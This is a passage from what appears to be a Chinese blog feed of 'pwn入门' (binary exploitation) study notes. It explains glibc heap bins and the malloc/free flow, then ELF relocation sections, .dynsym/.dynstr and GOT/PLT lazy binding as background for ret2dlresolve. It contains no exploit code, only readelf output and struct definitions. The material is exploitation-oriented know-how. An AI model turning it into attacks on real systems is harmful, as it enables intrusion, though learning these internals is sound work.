&lt;p&gt;​		large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405192532890.png&#34; alt=&#34;image-20230405192532890&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230401215539966.png&#34; alt=&#34;image-20230401215539966&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;tcachebin&#34;&gt;&lt;a href=&#34;#tcachebin&#34; class=&#34;headerlink&#34; title=&#34;tcachebin&#34;&gt;&lt;/a&gt;tcachebin&lt;/h2&gt;&lt;p&gt;2.26开始&lt;/p&gt;
&lt;h1 id=&#34;malloc和free流程&#34;&gt;&lt;a href=&#34;#malloc和free流程&#34; class=&#34;headerlink&#34; title=&#34;malloc和free流程&#34;&gt;&lt;/a&gt;malloc和free流程&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;http://raw.githubusercontent.com/cloudburst/libheap/master/heap.png&#34;&gt;raw.githubusercontent.com&amp;#x2F;cloudburst&amp;#x2F;libheap&amp;#x2F;master&amp;#x2F;heap.png&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;malloc&#34;&gt;&lt;a href=&#34;#malloc&#34; class=&#34;headerlink&#34; title=&#34;malloc&#34;&gt;&lt;/a&gt;malloc&lt;/h2&gt;&lt;p&gt;malloc的具体实现可以查看malloc.c中_int_malloc函数，大致流程如下：&lt;/p&gt;
&lt;p&gt;1.将大小按规则对齐，得到实际要分配的大小size&lt;/p&gt;
&lt;p&gt;2.检查size是否符合&lt;strong&gt;tcache bin&lt;/strong&gt;的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回&lt;/p&gt;
&lt;p&gt;3.检查size是否符合&lt;strong&gt;fast bin&lt;/strong&gt;的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回&lt;/p&gt;
&lt;p&gt;4.循环遍历&lt;strong&gt;unsorted bin&lt;/strong&gt;，寻找可用的free chunk&lt;/p&gt;
&lt;p&gt;​	•  如果遍历到的free chunk size正好和所需size相等，则分配返回&lt;/p&gt;
&lt;p&gt;​	•  如果遍历到的free chunk size和所需size不等，则将其从双链表中解链(unlink)，插入到对应大小的bins中&lt;/p&gt;
&lt;p&gt;5.根据size，以best-fit的方式，找到相应的&lt;strong&gt;small bin&lt;/strong&gt;或者&lt;strong&gt;large bin&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	• 对于small bin，如果size正好合适，那么unlink之后，直接将该chunk返回给用户；否则进行切割，剩下的部分重新插入到unsorted bin中。&lt;/p&gt;
&lt;p&gt;​	• 对于large bin，由于一个bin通常对应几个size，那么根据fd_nextsize的顺序，以size从大到小的顺序遍历chunk，同样采取best-fit的方式寻找合适的chunk，后续行为与small bin类似。&lt;/p&gt;
&lt;p&gt;6.使用&lt;strong&gt;top chunk&lt;/strong&gt;，将top chunk进行切割：&lt;/p&gt;
&lt;p&gt;• 如果top chunk size足够，则将切割下来的部分返回，剩下的部分继续作为top chunk&lt;/p&gt;
&lt;p&gt;• 如果top chunk size不够，则需要通过sysmalloc申请更多的堆空间&lt;/p&gt;
&lt;h2 id=&#34;free&#34;&gt;&lt;a href=&#34;#free&#34; class=&#34;headerlink&#34; title=&#34;free&#34;&gt;&lt;/a&gt;free&lt;/h2&gt;&lt;p&gt;free的具体实现可以查看malloc.c中_int_free函数，大致流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果free chunk的size属于&lt;strong&gt;tcache&lt;/strong&gt;范围内，且对应大小的tcache bin没有满，则插入到相应的&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;tcache bin中去&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果free chunk的size属于&lt;strong&gt;fast bin&lt;/strong&gt;范围内，且对应大小的tcache bin满了，则插入到fastbin&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;中去&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果上述条件均不满足，则通过该chunk的prev_inuse标志位检查是否可以前后向合并：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;• 如果可以合并，则将需要被合并的chunk先unlink下来，合并成一个更大的chunk后再插入到&lt;/p&gt;
&lt;p&gt;unsorted bin中（或合并到top chunk里面）&lt;/p&gt;
&lt;p&gt;• 如果不可以合并，则将该chunk直接插入到unsorted bin中&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;free chunk是mmap的chunk，那么调用munmap直接返回给系统&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;p&gt;ctf-wiki&lt;/p&gt;
&lt;p&gt;datacon训练营&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-02-28T10:35:20.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</id>
        <title>pwn入门-12-pltgot延迟绑定及符号解析</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
        <content type="html">&lt;p&gt;​		2023.7.8更新:很早之前已经写了这篇博客,但是只学了一点皮毛..只在表面,后面学到了ret2dlresolve漏洞发现需要理解这部分东西,又回炉重造,添加了需要学习的更细致的知识&lt;/p&gt;
&lt;h1 id=&#34;符号解析&#34;&gt;&lt;a href=&#34;#符号解析&#34; class=&#34;headerlink&#34; title=&#34;符号解析&#34;&gt;&lt;/a&gt;符号解析&lt;/h1&gt;&lt;h2 id=&#34;基础知识&#34;&gt;&lt;a href=&#34;#基础知识&#34; class=&#34;headerlink&#34; title=&#34;基础知识&#34;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;参考ctfwiki(wiki中是倒推的,感觉理解起来不如正推)&lt;/p&gt;
&lt;p&gt;​		在 ELF 文件中，对于每一个需要重定位的 ELF 节都有对应的重定位表，比如说 .text 节如果需要重定位，那么其对应的重定位表为 .rel.text。 所以.rel.plt就是plt节需要重定位所产生的节了.&lt;/p&gt;
&lt;p&gt;​		.rel.plt中就会包含一个指向这个符号的重定位表项. r_offset给出了要修改的位置,r_info给出了要修改的符号的符号表索引,所以r_info索引到了 .dynsym&lt;/p&gt;
&lt;p&gt;​		.dynsym中,st_name保存着动态符号在dynstr中的偏移&lt;/p&gt;
&lt;p&gt;​		.dynstr又是怎么来的呢? 答:当一个程序导入某个函数时,.dynstr就会包含对应函数名称的字符串(&lt;strong&gt;最后是根据这个字符串名字来进行解析的!!!&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708162249130.png&#34; alt=&#34;image-20230708162249130&#34;&gt;&lt;/p&gt;
&lt;p&gt;以       ret2dl中的例子来说,可以用readelf查看这些节(但在ida中不会显示的这么全,会放到LOAD段里)&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/ret2dl# readelf -S main_partial_relro_32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;There are 31 section headers, starting at offset 0x3848:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Section Headers:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 0]                   NULL            00000000 000000 000000 00      0   0  0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 1] .interp           PROGBITS        080481b4 0001b4 000013 00   A  0   0  1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 2] .note.gnu.build-i NOTE            080481c8 0001c8 000024 00   A  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 3] .note.gnu.propert NOTE            080481ec 0001ec 00001c 00   A  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 4] .note.ABI-tag     NOTE            08048208 000208 000020 00   A  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 5] .gnu.hash         GNU_HASH        08048228 000228 000020 04   A  6   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 6] .dynsym           DYNSYM          08048248 000248 0000a0 10   A  7   1  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 7] .dynstr           STRTAB          080482e8 0002e8 00006b 00   A  0   0  1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 8] .gnu.version      VERSYM          08048354 000354 000014 02   A  6   0  2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [ 9] .gnu.version_r    VERNEED         08048368 000368 000020 00   A  7   1  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [10] .rel.dyn          REL             08048388 000388 000018 08   A  6   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [11] .rel.plt          REL             080483a0 0003a0 000028 08  AI  6  24  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [12] .init             PROGBITS        08049000 001000 000024 00  AX  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [13] .plt              PROGBITS        08049030 001030 000060 04  AX  0   0 16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [14] .plt.sec          PROGBITS        08049090 001090 000050 10  AX  0   0 16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [15] .text             PROGBITS        080490e0 0010e0 000289 00  AX  0   0 16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [16] .fini             PROGBITS        0804936c 00136c 000018 00  AX  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [17] .rodata           PROGBITS        0804a000 002000 000008 00   A  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [18] .eh_frame_hdr     PROGBITS        0804a008 002008 000054 00   A  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [19] .eh_frame         PROGBITS        0804a05c 00205c 000150 00   A  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [20] .init_array       INIT_ARRAY      0804bf04 002f04 000004 04  WA  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [21] .fini_array       FINI_ARRAY      0804bf08 002f08 000004 04  WA  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [22] .dynamic          DYNAMIC         0804bf0c 002f0c 0000e8 08  WA  7   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [23] .got              PROGBITS        0804bff4 002ff4 00000c 04  WA  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [24] .got.plt          PROGBITS        0804c000 003000 000020 04  WA  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [25] .data             PROGBITS        0804c020 003020 000008 00  WA  0   0  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [26] .bss              NOBITS          0804c028 003028 000004 00  WA  0   0  1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [27] .comment          PROGBITS        00000000 003028 00002b 01  MS  0   0  1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [28] .symtab           SYMTAB          00000000 003054 000480 10     29  45  4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [29] .strtab           STRTAB          00000000 0034d4 000254 00      0   0  1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [30] .shstrtab         STRTAB          00000000 003728 00011d 00      0   0  1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Key to Flags:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  L (link order), O (extra OS processing required), G (group), T (TLS),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  C (compressed), x (unknown), o (OS specific), E (exclude),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p (processor specific)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;rel-plt&#34;&gt;&lt;a href=&#34;#rel-plt&#34; class=&#34;headerlink&#34; title=&#34;.rel.plt&#34;&gt;&lt;/a&gt;.rel.plt&lt;/h3&gt;&lt;p&gt;​		.rel.dyn是动态链接的二进制文件中需要重定位的变量的信息,.rel.plt是需要重定位的函数的信息&lt;/p&gt;
&lt;p&gt;​		它的结构如下(以32位为例),两种类型区别见wiki&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr        r_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word       r_info;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Rel;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr     r_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word    r_info;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Sword    r_addend;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Rela;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708162230315.png&#34; alt=&#34;image-20230708162230315&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		最重要的就是前两个字段,r_offset,给出了需要重定位的位置,对于可执行文件而言,取值是需要重定位的&lt;b&gt;虚拟地址&lt;/b&gt;,一般而言也就是GOT表的地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163140389.png&#34; alt=&#34;image-20230708163140389&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		GOT表中开始存放的值是这个&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163342737.png&#34; alt=&#34;image-20230708163342737&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		这玩意也就是plt表,要进行真正解析的地方&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163428111.png&#34; alt=&#34;image-20230708163428111&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		r_info给出需要重定位的符号的符号表索引,以及相应的重定位类型. &lt;b&gt;换句话说,第一个参数是告诉你要把哪里的值进行修改,这个参数是告诉你,要修改哪个符号.&lt;/b&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;高三个字节对应的值表示这个动态符号在.dynsym符号表中的位置&lt;/li&gt;
&lt;li&gt;最低字节表示的是重定位类型&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dynsym&#34;&gt;&lt;a href=&#34;#dynsym&#34; class=&#34;headerlink&#34; title=&#34;.dynsym&#34;&gt;&lt;/a&gt;.dynsym&lt;/h3&gt;&lt;p&gt;​		结构如下&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf32_Word    st_name;   &lt;span class=&#34;comment&#34;&gt;/* Symbol name (string tbl index) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf32_Addr    st_value;  &lt;span class=&#34;comment&#34;&gt;/* Symbol value */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf32_Word    st_size;   &lt;span class=&#34;comment&#34;&gt;/* Symbol size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; st_info;   &lt;span class=&#34;comment&#34;&gt;/* Symbol type and binding */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; st_other;  &lt;span class=&#34;comment&#34;&gt;/* Symbol visibility under glibc&amp;gt;=2.2 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf32_Section st_shndx;  &lt;span class=&#34;comment&#34;&gt;/* Section index */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Sym;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这个在ida中也是没有直接给出的,可以用readelf查看然后寻找.&lt;/p&gt;
&lt;p&gt;​		其中比较重要的字段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;st_name 保存着动态符号在.dynstr表(动态字符串表)中的偏移&lt;/li&gt;
&lt;li&gt;st_value 如果这个符号被导出,这个符号保存着对应的虚拟地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708164800762.png&#34; alt=&#34;image-20230708164800762&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Elf32_Sym &amp;lt;offset aRead - offset unk_80482E8, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;h, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt; ; &lt;span class=&#34;string&#34;&gt;&amp;quot;read&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		以read为例,aRead是这个符号的虚拟地址, 减去符号表开始的虚拟地址,就得到了偏移, read的这个值为0x27&lt;/p&gt;
&lt;p&gt;0x804830F - 0x80482E8 &amp;#x3D; 0x27,也就是read这个字符串开始的地方,(以及他们每个字符串结束后都有个0,位置结束符号)&lt;/p&gt;
&lt;p&gt;​		dynstr表如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708165101316.png&#34; alt=&#34;image-20230708165101316&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;dynmaic&#34;&gt;&lt;a href=&#34;#dynmaic&#34; class=&#34;headerlink&#34; title=&#34;.dynmaic&#34;&gt;&lt;/a&gt;.dynmaic&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708172738811.png&#34; alt=&#34;image-20230708172738811&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;解析过程&#34;&gt;&lt;a href=&#34;#解析过程&#34; class=&#34;headerlink&#34; title=&#34;解析过程&#34;&gt;&lt;/a&gt;解析过程&lt;/h2&gt;&lt;h1 id=&#34;got-plt-got-plt-延迟绑定&#34;&gt;&lt;a href=&#34;#got-plt-got-plt-延迟绑定&#34; class=&#34;headerlink&#34; title=&#34;got plt .got.plt 延迟绑定&#34;&gt;&lt;/a&gt;got plt .got.plt 延迟绑定&lt;/h1&gt;&lt;h2 id=&#34;got表-got-plt表&#34;&gt;&lt;a href=&#34;#got表-got-plt表&#34; class=&#34;headerlink&#34; title=&#34;got表 got.plt表&#34;&gt;&lt;/a&gt;got表 got.plt表&lt;/h2&gt;&lt;p&gt;​		Globle offset table全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址，GOT表存储在数据段，（在IDA中是也就是.data段）可以在程序运行中被修改。&lt;/p&gt;
&lt;p&gt;​		.got 存放全局变量引用&lt;/p&gt;
&lt;p&gt;​		.got.plt 存放需要延迟绑定的函数&lt;/p&gt;
&lt;p&gt;​		got表的初始状态指向一段plt,首次调用时会由plt表中指令进行解析,得到真正的函数地址(即内存中的地址)并填入相应的got表项&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230228164021947.png&#34; alt=&#34;image-20230228164021947&#34;&gt;&lt;/p&gt;
